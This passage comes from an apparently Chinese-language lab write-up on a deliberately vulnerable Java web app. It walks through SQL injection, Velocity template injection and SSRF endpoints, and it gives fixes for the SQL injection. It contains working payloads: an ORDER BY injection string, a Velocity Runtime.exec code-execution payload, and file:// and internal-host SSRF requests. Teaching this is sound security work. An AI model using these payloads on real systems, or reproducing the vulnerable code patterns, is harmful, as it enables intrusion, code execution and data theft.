<h4 id="2-sqli-jdbc-ps-vuln"><a href="#2-sqli-jdbc-ps-vuln" class="headerlink" title="2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">jdbc_ps_vuln</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(driver);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">                System.out.println(<span class="string">&quot;Connecting to Database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            logger.info(st.toString());</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">                result.append(info);</span><br><span class="line">                logger.info(info);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rs.close();</span><br><span class="line">            con.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>漏洞成因：预处理语句在sql语句之后，没起到防护的作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;;</span><br><span class="line">PreparedStatement st = con.prepareStatement(sql);</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png" alt="image-20250525203533438" loading="lazy"></p>
<h4 id="3-sqli-mybatis-vuln01"><a href="#3-sqli-mybatis-vuln01" class="headerlink" title="3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01"></a>3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> userMapper.findByUserNameVuln01(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来看findByUserNameVuln01</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByUserNameVuln01</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里用到的是MyBatis框架，用来指定 SQL 查询语句。**<code>$&#123;username&#125;</code>**：在这里，<code>username</code> 是直接拼接到 SQL 查询中的。这意味着输入的内容会直接插入到 SQL 语句中，而不会进行任何预处理或转义。因此我们仍然可以用上面的方法进行SQL注入。</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" loading="lazy"></p>
<p>修复代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" alt="image-20250525210117585" loading="lazy"></p>
<h4 id="4-sqli-mybatis-vuln02"><a href="#4-sqli-mybatis-vuln02" class="headerlink" title="4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02"></a>4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/vuln02&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln02</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> userMapper.findByUserNameVuln02(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来看findByUserNameVuln02</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; <span class="title function_">findByUserNameVuln02</span><span class="params">(String username)</span>;</span><br></pre></td></tr></table></figure>

<p>这里去掉了映射关系，不影响漏洞存在，仍然可以使用之前payload</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png" alt="image-20250525211935573" loading="lazy"></p>
<h4 id="5-sqli-mybatis-orderby-vuln03"><a href="#5-sqli-mybatis-orderby-vuln03" class="headerlink" title="5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br><span class="line">   public List&lt;User&gt; mybatisVuln03(@RequestParam(&quot;sort&quot;) String sort) &#123;</span><br><span class="line">       return userMapper.findByUserNameVuln03(sort);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们来看findByUserNameVuln03</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; findByUserNameVuln03(@Param(&quot;order&quot;) String order);</span><br></pre></td></tr></table></figure>

<p>使用了MyBatis框架中的order字段，换用下面方法进行注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=id desc--+</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png" alt="image-20250525214518039" loading="lazy"></p>
<h4 id="sql注入修复与防护"><a href="#sql注入修复与防护" class="headerlink" title="sql注入修复与防护"></a>sql注入修复与防护</h4><p>1.预编译</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.waf</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">FILTER_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sqlFilter</span><span class="params">(String sql)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (!FILTER_PATTERN.matcher(sql).matches()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> sql;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.MyBatis防护</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br></pre></td></tr></table></figure>



<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h4 id="ssti-velocity"><a href="#ssti-velocity" class="headerlink" title="&#x2F;ssti&#x2F;velocity"></a>&#x2F;ssti&#x2F;velocity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@GetMapping(&quot;/velocity&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">velocity</span><span class="params">(String template)</span> &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Elliot A.&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;address&quot;</span>, <span class="string">&quot;217 E Broadway&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;555-1337&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">swOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">&quot;test&quot;</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=Apache+Velocity&zhida_source=entity">Apache Velocity</a>是一个基于模板的引擎，用于生成文本输出(例如：HTML、XML或任何其他形式的ASCII文本)，它的设计目标是提供一种简单且灵活的方式来将模板和<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B0%E6%8D%AE&zhida_source=entity">上下文数据</a>结合在一起，因此被广泛应用于各种Java应用程序中包括Web应用</p>
<p>模版注入问题各个语言斗鱼，但这里只用到了velocity，除了velocity，thymeleaf等都是会有ssti问题</p>
<p><strong>Velocity.evaluate</strong></p>
<p><strong>方法介绍</strong></p>
<p>Velocity.evaluate是Velocity引擎中的一个方法，用于处理字符串模板的评估，Velocity是一个基于Java的模板引擎，广泛应用于WEB开发和其他需要动态内容生成的场合，Velocity.evaluate方法的主要作用是将给定的模板字符串与上下文对象结合并生成最终的输出结果，这个方法通常用于在运行时动态创建内容，比如：生成HTML页面的内容或电子邮件的文本，方法如下所示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static void evaluate(Context context, Writer writer, String templateName, String template)</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>Context context：提供模板所需的数据上下文，可以包含多个键值对</li>
<li>Writer writer：输出流，用于写入生成的内容</li>
<li>String templateName：模板的名称，通常用于调试信息中</li>
<li>String template：要评估的模板字符串</li>
</ul>
<p>我们构造如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png" alt="image-20250527201721864" loading="lazy"></p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="1-ssrf-urlConnection-vuln"><a href="#1-ssrf-urlConnection-vuln" class="headerlink" title="1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln"></a>1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">URLConnectionVuln</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们来看URLConnection</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">URLConnection</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="comment">//send request</span></span><br><span class="line">        String inputLine;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> html.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以用文件读取协议file:&#x2F;&#x2F;实现访问</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png" alt="image-20250527205331156" loading="lazy"></p>
<h4 id="2-ssrf-HttpURLConnection-vuln"><a href="#2-ssrf-HttpURLConnection-vuln" class="headerlink" title="2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln"></a>2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/HttpURLConnection/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">httpURLConnectionVuln</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.HttpURLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来看HttpURLConnection</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">HttpURLConnection</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">            <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) urlConnection;</span><br><span class="line"><span class="comment">//             conn.setInstanceFollowRedirects(false);</span></span><br><span class="line"><span class="comment">//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> conn.getInputStream();  <span class="comment">// send request</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">            String inputLine;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                html.append(inputLine);</span><br><span class="line">            &#125;</span><br><span class="line">            in.close();</span><br><span class="line">            <span class="keyword">return</span> html.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里用HttpURLConnection做了强转，限制只能用http&#x2F;htps协议，但可以访问内网其他主机</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png" alt="image-20250527210533999" loading="lazy"></p>
<p>访问到了首页</p>
<h4 id="3-ssrf-openStream"><a href="#3-ssrf-openStream" class="headerlink" title="3.&#x2F;ssrf&#x2F;openStream"></a>3.&#x2F;ssrf&#x2F;openStream</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/openStream&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">openStream</span><span class="params">(<span class="meta">@RequestParam</span> String url, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">downLoadImgFileName</span> <span class="operator">=</span> WebUtils.getNameWithoutExtension(url) + <span class="string">&quot;.&quot;</span> + WebUtils.getFileExtension(url);</span><br><span class="line">        <span class="comment">// download</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;fileName=&quot;</span> + downLoadImgFileName);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream = u.openStream(); <span class="comment">// send request</span></span><br><span class="line">        outputStream = response.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span> ((length = inputStream.read(bytes)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(bytes, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (outputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过这个路由实现任意文件下载：</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png" alt="image-20250527213236260" loading="lazy"></p>
<h4 id="4-ssrf-HttpSyncClients-vuln"><a href="#4-ssrf-HttpSyncClients-vuln" class="headerlink" title="4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln"></a>4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/HttpSyncClients/vuln&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">HttpSyncClients</span><span class="params">(<span class="meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> HttpUtils.HttpAsyncClients(url);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>我们来看HttpAsyncClients</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">HttpAsyncClients</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="type">CloseableHttpAsyncClient</span> <span class="variable">httpclient</span> <span class="operator">=</span> HttpAsyncClients.createDefault();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        httpclient.start();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">HttpGet</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        Future&lt;HttpResponse&gt; future = httpclient.execute(request, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> future.get(<span class="number">6000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        <span class="keyword">return</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            httpclient.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现没有对url进行检查，所以可以使用ssrf</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png" alt="image-20250527213854753" loading="lazy"></p>
<h4 id="5-ssrf-restTemplate-vuln1"><a href="#5-ssrf-restTemplate-vuln1" class="headerlink" title="5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1"></a>5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/restTemplate/vuln1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">RestTemplateUrlBanRedirects</span><span class="params">(String url)</span>&#123;</span><br><span class="line">    <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">    headers.setContentType(MediaType.APPLICATION_JSON_UTF8);</span><br><span class="line">    <span class="keyword">return</span> httpService.RequestHttpBanRedirects(url, headers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码使用 <strong>Spring RestTemplate</strong> 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问</p>
<p>注：为什么需要加个&#x2F;login</p>
<p>因为<a target="_blank" rel="noopener" href="http://60.205.158.87:8080/%E4%BC%9A%E9%BB%98%E8%AE%A4%E8%B7%B3%E8%BD%AC%E5%88%B0/login%EF%BC%8C%E8%80%8C%E4%BB%A3%E7%A0%81%E7%A6%81%E6%AD%A2%E4%BA%86%E9%87%8D%E5%AE%9A%E5%90%91">http://60.205.158.87:8080/会默认跳转到/login，而代码禁止了重定向</a></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png" alt="image-20250527214625396" loading="lazy"></p>
<p>既然已经禁止了重定向（Redirect），为什么 SSRF 仍然可能发生？</p>
<hr>
<p>一、什么是 SSRF？</p>
